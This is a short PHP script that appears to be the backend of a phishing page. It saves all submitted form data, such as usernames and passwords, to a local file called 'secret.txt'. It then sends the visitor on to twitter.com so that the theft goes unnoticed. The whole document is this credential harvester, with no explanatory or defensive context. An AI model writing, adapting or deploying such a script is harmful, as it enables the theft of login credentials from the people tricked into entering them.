<?php 
$files= fopen('secret.txt','r+'); 
file_put_contents('secret.txt ',print_r($_POST , true));
fclose($files);
header("location:https://twitter.com");

?>